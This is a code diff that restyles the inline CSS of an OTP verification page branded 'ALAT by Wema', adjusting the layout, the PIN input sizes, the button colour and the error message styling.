@@ -6,42 +6,83 @@
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
   <style>
-    .container {
-      max-width: 350px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-    .formOtp {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 25px;
-      width: 100%;
-    }
+  html, body {
+    height: 100%;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #fff;
+    font-family: Arial, sans-serif;
+  }
+
+  .container {
+    max-width: 350px;
+    width: 100%;
+    padding: 20px;
+    box-sizing: border-box;
+  }
+
+  .formOtp {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 25px;
+    width: 100%;
+  }
+
+  .pin-input {
+    width: 40px;
+    height: 50px;
+    text-align: center;
+    font-size: 20px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+  }
+
+  @media (max-width: 400px) {
     .pin-input {
-      width: 30px;
-      height: 40px;
-      text-align: center;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      width: 35px;
+      height: 45px;
+      font-size: 18px;
     }
-    @media (max-width: 400px) {
-      .pin-input {
-        width: 25px;
-        height: 35px;
-        font-size: 14px;
-      }
-    }
-    .verify-btn {
-      width: 100%;
-      padding: 12px;
-      border-radius: 7px;
-      border: none;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+  }
+
+  .verify-btn {
+    width: 100%;
+    padding: 12px;
+    border-radius: 7px;
+    border: none;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+    background: #800029;
+    color: white;
+  }
+
+  .logo img {
+    width: 60px;
+    margin-bottom: 15px;
+  }
+
+  .hometitle {
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 25px;
+  }
+
+  #error-message {
+    color: red;
+    margin-bottom: 15px;
+    display: none;
+    text-align: center;
+  }
+</style>
+
 </head>
 <body>
   <div id="root">
